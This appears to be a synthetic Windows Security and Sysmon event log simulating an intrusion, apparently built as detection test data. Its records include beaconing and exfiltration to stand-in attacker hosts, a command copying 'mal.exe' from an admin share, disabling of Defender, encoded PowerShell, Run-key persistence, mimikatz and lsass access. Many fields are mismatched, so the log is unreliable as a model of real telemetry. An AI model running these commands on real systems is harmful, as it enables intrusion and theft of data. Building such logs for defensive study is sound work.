  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:51.0000000Z" /><EventRecordID>1486</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="TargetServerName">WKSTN-CHARLIE</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:53.0000000Z" /><EventRecordID>1487</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="ObjectName">C:\Users\Public\Documents\exfil.zip</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:41:00.0000000Z" /><EventRecordID>1488</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:41:00.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">41434</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data><Data Name="Details">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:41:04.0000000Z" /><EventRecordID>1489</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">29996</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:41:15.0000000Z" /><EventRecordID>1490</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xf939</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x6e6</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:41:20.0000000Z" /><EventRecordID>1491</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">.</Data><Data Name="SubjectLogonId">0x18954d</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:41:46.0000000Z" /><EventRecordID>1492</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:41:46.0000000Z</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="User">CORP\svc_sql</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">203.0.113.45</Data><Data Name="SourcePort">42001</Data><Data Name="DestinationIp">172.16.5.10</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationHostname">beacon.attacker.top</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:42:16.0000000Z" /><EventRecordID>1493</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:42:16.0000000Z</Data><Data Name="ProcessId">31854</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="QueryName">www.microsoft.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">172.16.5.10</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:42:22.0000000Z" /><EventRecordID>1494</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">john.doe</Data><Data Name="Workstation">DC01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:42:36.0000000Z" /><EventRecordID>1495</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:42:36.0000000Z</Data><Data Name="ProcessGuid">{06435-43C2-10A12-16D73}</Data><Data Name="ProcessId">47569</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="CommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="User">CORP\charlie</Data><Data Name="ParentProcessId">5248</Data><Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data><Data Name="ParentCommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="Hashes">MD5=e6b29edb260e498b0fcf0847a853c0fb,SHA256=8b6942dab0efb531c8f9b4a73e5a2f9de6c2c9bcf1c644045a882955cb8e57d6</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:43:34.0000000Z" /><EventRecordID>1496</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:43:34.0000000Z</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="User">.\jane.smith</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.0.5</Data><Data Name="SourcePort">62663</Data><Data Name="DestinationIp">10.0.2.99</Data><Data Name="DestinationPort">1337</Data><Data Name="DestinationHostname">exfil.ngrok.io</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:48:00.0000000Z" /><EventRecordID>1497</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TaskName">\Microsoft\Windows\UpdateOrchestrator\Schedule Scan</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:48:15.0000000Z" /><EventRecordID>1498</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:48:15.0000000Z</Data><Data Name="ProcessId">3916</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetFilename">C:\Users\Public\Documents\exfil.zip</Data><Data Name="CreationUtcTime">2024-11-25T15:48:15.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:48:20.0000000Z" /><EventRecordID>1499</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0x3c47a5</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:48:56.0000000Z" /><EventRecordID>1500</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:48:56.0000000Z</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="User">.\bob</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">198.51.100.23</Data><Data Name="SourcePort">31580</Data><Data Name="DestinationIp">203.0.113.45</Data><Data Name="DestinationPort">8443</Data><Data Name="DestinationHostname">au.download.windowsupdate.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:49:11.0000000Z" /><EventRecordID>1501</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:49:11.0000000Z</Data><Data Name="SourceProcessId">31343</Data><Data Name="SourceImage">C:\Windows\System32\lsass.exe</Data><Data Name="TargetProcessId">6777</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0xfb02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:49:30.0000000Z" /><EventRecordID>1502</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1329-3774-1171-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">42832</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:49:57.0000000Z" /><EventRecordID>1503</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::203.0.113.45</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:02.0000000Z" /><EventRecordID>1504</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x79fa</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x49d</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:07.0000000Z" /><EventRecordID>1505</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">46739</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:19.0000000Z" /><EventRecordID>1506</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::172.16.5.10</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:21.0000000Z" /><EventRecordID>1507</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:50:21.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">63237</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor</Data><Data Name="Details">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:33.0000000Z" /><EventRecordID>1508</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x451b</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x679</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:50:47.0000000Z" /><EventRecordID>1509</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:50:47.0000000Z</Data><Data Name="SourceProcessId">49701</Data><Data Name="SourceImage">C:\Windows\System32\lsass.exe</Data><Data Name="TargetProcessId">53054</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1410</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x273b</Data></EventData></Event>
  